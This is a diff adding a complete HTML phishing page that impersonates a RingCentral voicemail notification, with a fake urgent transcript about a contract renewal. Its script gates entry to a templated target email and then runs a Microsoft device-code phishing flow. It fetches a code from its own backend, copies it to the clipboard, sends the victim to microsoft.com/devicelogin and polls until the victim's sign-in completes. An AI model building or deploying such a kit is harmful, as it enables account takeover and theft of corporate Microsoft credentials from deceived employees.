@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RingCentral — New Voicemail Message</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f5f5f5;font-family:'Nunito','Helvetica Neue',Arial,sans-serif;min-height:100vh}
+.page{max-width:660px;margin:0 auto;background:#fff;box-shadow:0 2px 20px rgba(0,0,0,.08)}
+
+/* RingCentral Header */
+.rc-header{background:#fff;padding:18px 32px;border-bottom:3px solid #FF8C00;display:flex;align-items:center;justify-content:space-between}
+/* CSS RingCentral logo: orange circle + RC text */
+.rc-logo{display:flex;align-items:center;gap:12px}
+.rc-circle{width:38px;height:38px;background:#FF8C00;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:15px;font-weight:800;letter-spacing:-1px;font-family:'Nunito',sans-serif}
+.rc-name{font-size:20px;font-weight:800;color:#1a1a1a;letter-spacing:-.5px}
+.rc-name span{color:#FF8C00}
+.rc-tag{font-size:11px;color:#999;background:#f5f5f5;border-radius:20px;padding:3px 10px;border:1px solid #e8e8e8}
+
+/* Orange notification banner */
+.notif-banner{background:linear-gradient(135deg,#FF8C00,#e67e00);padding:28px 32px;color:#fff;position:relative;overflow:hidden}
+.notif-banner::after{content:'';position:absolute;right:-30px;top:-30px;width:150px;height:150px;background:rgba(255,255,255,.08);border-radius:50%}
+.notif-banner::before{content:'';position:absolute;left:-20px;bottom:-20px;width:100px;height:100px;background:rgba(255,255,255,.06);border-radius:50%}
+.nb-inner{position:relative}
+.nb-eyebrow{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;opacity:.8;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.nb-title{font-size:22px;font-weight:800;margin-bottom:4px}
+.nb-sub{font-size:13px;opacity:.85}
+
+/* Caller card */
+.content{padding:28px 32px}
+.caller-section{background:#fff8f0;border:1.5px solid #ffe0b2;border-radius:10px;padding:20px;margin-bottom:22px;display:flex;gap:18px;align-items:center}
+.caller-col{flex:1;min-width:0}
+.caller-name-row{display:flex;align-items:center;gap:10px;margin-bottom:4px}
+.caller-name{font-size:17px;font-weight:800;color:#1a1a1a}
+.missed-pill{background:#ffe0e0;color:#d32f2f;border-radius:20px;padding:2px 10px;font-size:10px;font-weight:700;white-space:nowrap}
+.caller-number{font-size:13px;color:#888;margin-bottom:3px}
+.caller-ext{font-size:12px;color:#FF8C00;font-weight:700}
+.call-meta{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0}
+.meta-chip{display:flex;align-items:center;gap:5px;font-size:12px;color:#555;background:#fff;border:1px solid #e0e0e0;border-radius:20px;padding:3px 10px}
+
+/* Audio player card */
+.player-section{background:#1a1a1a;border-radius:10px;padding:18px 20px;margin-bottom:22px}
+.player-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+.pl-label{font-size:11px;font-weight:700;color:#FF8C00;text-transform:uppercase;letter-spacing:.5px}
+.pl-dur{font-size:12px;color:#666;font-family:monospace}
+/* Waveform */
+.waveform{display:flex;align-items:center;gap:2.5px;height:44px;margin-bottom:14px}
+.wb{background:#333;border-radius:2px;flex:1;transition:background .2s}
+.wb.p{background:#FF8C00}
+.wb.pp{background:#e67e00}
+/* Controls row */
+.player-controls{display:flex;align-items:center;gap:14px}
+.play-b{width:46px;height:46px;background:#FF8C00;border-radius:50%;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 12px rgba(255,140,0,.4);transition:transform .1s}
+.play-b:hover{transform:scale(1.05)}
+.pl-time{font-size:12px;color:#666;font-family:monospace;flex:1}
+.pl-share{background:transparent;border:1px solid #333;border-radius:6px;padding:5px 12px;font-size:12px;color:#888;cursor:pointer;font-family:inherit}
+
+/* AI Transcript */
+.transcript-card{background:#fafafa;border:1px solid #f0f0f0;border-radius:10px;padding:16px;margin-bottom:22px}
+.tc-header{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.tc-badge{background:#FF8C00;color:#fff;border-radius:4px;padding:2px 8px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.tc-note{font-size:11px;color:#bbb}
+.tc-text{font-size:13px;color:#555;line-height:1.8;font-style:italic;border-left:3px solid #FF8C00;padding-left:12px}
+
+/* Action buttons - RingCentral style */
+.actions-row{display:flex;gap:12px;margin-bottom:10px}
+.btn-listen{flex:2;background:#FF8C00;color:#fff;border:none;border-radius:8px;padding:14px;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 14px rgba(255,140,0,.3);transition:background .15s}
+.btn-listen:hover{background:#e67e00}
+.btn-cb{flex:1;background:#fff;color:#FF8C00;border:2px solid #FF8C00;border-radius:8px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;transition:background .15s}
+.btn-cb:hover{background:#fff8f0}
+.action-note{font-size:11px;color:#bbb;text-align:center;margin-bottom:20px}
+
+/* RingCentral bottom nav strip */
+.rc-strip{background:#f5f5f5;border-top:1px solid #e8e8e8;padding:16px 32px;display:flex;align-items:center;gap:20px}
+.strip-item{display:flex;align-items:center;gap:6px;font-size:12px;color:#888}
+.strip-icon{width:28px;height:28px;background:#fff;border-radius:6px;border:1px solid #e8e8e8;display:flex;align-items:center;justify-content:center}
+
+/* Footer */
+.footer{background:#1a1a1a;padding:18px 32px}
+.footer-logo{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.footer-rc-circle{width:24px;height:24px;background:#FF8C00;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:10px;font-weight:800}
+.footer p{font-size:11px;color:#666;line-height:1.7}
+.footer a{color:#FF8C00}
+
+/* Auth overlay */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);align-items:center;justify-content:center}
+.auth-box{background:#fff;border-radius:12px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+/* Email gate */
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.7);backdrop-filter:blur(6px)}
+.gate-box{background:#fff;border-radius:12px;padding:36px 28px;width:90%;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4)}
+.gate-input{width:100%;padding:12px 14px;border:2px solid #e8e8e8;border-radius:8px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;transition:border .15s}
+.gate-input:focus{border-color:#FF8C00}
+.gate-btn{width:100%;background:#FF8C00;color:#fff;border:none;border-radius:8px;padding:13px;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit}
+.gate-btn:hover{background:#e67e00}
+.gate-err{color:#d32f2f;font-size:13px;margin-bottom:8px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style>
+</head>
+<body>
+<div class="page">
+  <!-- RingCentral Header -->
+  <div class="rc-header">
+    <div class="rc-logo">
+      <div class="rc-circle">RC</div>
+      <div class="rc-name">Ring<span>Central</span></div>
+    </div>
+    <div class="rc-tag">Business Phone System</div>
+  </div>
+
+  <!-- Orange notification banner -->
+  <div class="notif-banner">
+    <div class="nb-inner">
+      <div class="nb-eyebrow">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+        New Voicemail Notification
+      </div>
+      <div class="nb-title">You have 1 new voicemail message</div>
+      <div class="nb-sub">Received today at 2:43 PM · Duration: 0:42 · Click to listen online</div>
+    </div>
+  </div>
+
+  <!-- Content -->
+  <div class="content">
+    <!-- Caller card -->
+    <div class="caller-section">
+      <div style="width:52px;height:52px;background:linear-gradient(135deg,#FF8C00,#e67e00);border-radius:50%;color:#fff;font-size:20px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0">✉</div>
+      <div class="caller-col">
+        <div class="caller-name-row">
+          <span class="caller-name">New Voicemail Received</span>
+          <span class="missed-pill">MISSED CALL</span>
+        </div>
+        <div class="caller-number">RingCentral · Business Voicemail</div>
+        <div class="caller-ext">You missed a call · New message waiting</div>
+      </div>
+      <div class="call-meta">
+        <div class="meta-chip">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="#888"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm.5 5H11v6l5.2 3.2.8-1.3-4.5-2.7V7z"/></svg>
+          0:42
+        </div>
+        <div class="meta-chip">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="#888"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+          Today
+        </div>
+      </div>
+    </div>
+
+    <!-- Dark audio player -->
+    <div class="player-section">
+      <div class="player-top">
+        <span class="pl-label">🎙 Voicemail Recording</span>
+        <span class="pl-dur">0:00 / 0:42</span>
+      </div>
+      <div class="waveform">
+        <div class="wb pp" style="height:22%"></div><div class="wb p" style="height:40%"></div><div class="wb p" style="height:65%"></div><div class="wb p" style="height:90%"></div><div class="wb p" style="height:78%"></div><div class="wb p" style="height:55%"></div><div class="wb" style="height:85%"></div><div class="wb" style="height:100%"></div><div class="wb" style="height:88%"></div><div class="wb" style="height:75%"></div><div class="wb" style="height:60%"></div><div class="wb" style="height:90%"></div><div class="wb" style="height:70%"></div><div class="wb" style="height:45%"></div><div class="wb" style="height:55%"></div><div class="wb" style="height:80%"></div><div class="wb" style="height:65%"></div><div class="wb" style="height:38%"></div><div class="wb" style="height:50%"></div><div class="wb" style="height:30%"></div>
+      </div>
+      <div class="player-controls">
+        <button class="play-b" onclick="startAuth()">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+        </button>
+        <div class="pl-time">Tap to authenticate &amp; play</div>
+        <button class="pl-share" onclick="startAuth()">Download</button>
+      </div>
+    </div>
+
+    <!-- AI Transcript -->
+    <div class="transcript-card">
+      <div class="tc-header">
+        <span class="tc-badge">AI Transcript</span>
+        <span class="tc-note">Auto-generated · may not be 100% accurate</span>
+      </div>
+      <div class="tc-text">"Hi, I'm calling regarding the proposal you sent over. I need to discuss the contract renewal before end of week — it's quite urgent. Please return my call at your earliest convenience. Thank you."</div>
+    </div>
+
+    <!-- Action buttons -->
+    <div class="actions-row">
+      <button class="btn-listen" onclick="startAuth()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+        Listen Online
+      </button>
+      <button class="btn-cb" onclick="startAuth()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#FF8C00"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+        Call Back
+      </button>
+    </div>
+    <div class="action-note">Sign in with your Microsoft account to authenticate and access voicemail</div>
+
+    <!-- RC App strip -->
+    <div class="rc-strip" style="margin:0 -32px;padding:14px 32px">
+      <div class="strip-item">
+        <div class="strip-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="#FF8C00"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
+        Call Back
+      </div>
+      <div class="strip-item">
+        <div class="strip-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="#FF8C00"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg></div>
+        Send SMS
+      </div>
+      <div class="strip-item">
+        <div class="strip-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="#FF8C00"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg></div>
+        Download
+      </div>
+      <div style="margin-left:auto;font-size:11px;color:#ccc">Open in RingCentral app →</div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="footer-logo">
+      <div class="footer-rc-circle">RC</div>
+      <span style="font-size:13px;font-weight:700;color:#fff">RingCentral</span>
+      <span style="font-size:11px;color:#555">· Business Phone &amp; Messaging</span>
+    </div>
+    <p>© 2026 RingCentral, Inc. All rights reserved. · 20 Davis Drive, Belmont, CA 94002</p>
+    <p>You received this voicemail notification because you have an active RingCentral account. <a href="#">Notification Settings</a> · <a href="#">Privacy Policy</a></p>
+  </div>
+</div>
+
+<!-- Auth overlay: Microsoft device code flow -->
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:18px">
+      <svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span style="font-size:15px;font-weight:300;color:#555">Microsoft</span>
+    </div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:800;color:#1a1a1a;margin-bottom:6px">Sign in to listen</h3>
+    <p id="auth-sub" style="font-size:13px;color:#888;margin-bottom:22px;line-height:1.6">RingCentral requires your Microsoft account to authenticate and play this voicemail.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #eee;border-top-color:#FF8C00;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px"></div><p style="font-size:13px;color:#bbb">Connecting…</p></div>
+        <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#aaa;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#fff;font-family:monospace;background:rgba(0,0,0,.2);border-radius:6px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed rgba(255,255,255,.2)" onclick="openLogin()"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:8px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#FF8C00;color:#fff;box-shadow:0 4px 14px rgba(0,0,0,.3)">
+        <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+        Open Microsoft Device Login →
+      </button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#777;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;text-decoration:underline">Copy manually</span></p>
+    </div>
+      <div id="ok-sec" style="display:none">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="#22c55e" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      <p style="font-size:15px;font-weight:700;color:#22c55e">Signed In</p>
+      <p style="font-size:13px;color:#aaa;margin-top:4px">Loading voicemail…</p>
+    </div>
+  </div>
+</div>
+
+<!-- Email gate -->
+<div id="email-gate">
+  <div class="gate-box">
+    <div style="width:52px;height:52px;background:#FF8C00;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;color:#fff;font-size:18px;font-weight:800">RC</div>
+    <p style="font-size:17px;font-weight:800;color:#1a1a1a;margin-bottom:6px">Confirm Your Email</p>
+    <p style="font-size:13px;color:#888;margin-bottom:20px;line-height:1.6">This voicemail notification was delivered to your work email. Enter the email address where you received this to listen to the recording.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ We couldn't find a voicemail for that email. Please check and try again.</div>
+    <button class="gate-btn" onclick="gv()">Verify &amp; Listen →</button>
+    <p style="font-size:11px;color:#ddd;margin-top:12px">🔒 RingCentral Secure Portal</p>
+  </div>
+</div>
+
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#d32f2f';i.style.animation='sh .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code||d.userCode;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';setTimeout(()=>window.location.href='https://app.ringcentral.com',2500);}}).catch(()=>{});},( d.interval||5)*1000);}).catch(()=>location.reload());}
+
+function openLogin(){
+  cpCode();
+  const url='https://microsoft.com/devicelogin';
+  const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');
+  if(!w||w.closed||typeof w.closed==='undefined'){
+    // Popup blocked — fall back to redirect in same tab after short delay
+    const btn=document.getElementById('open-btn');
+    if(btn){btn.textContent='⏎ Redirecting…';}
+    setTimeout(()=>window.location.href=url,800);
+  }
+}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script>
+</body></html>
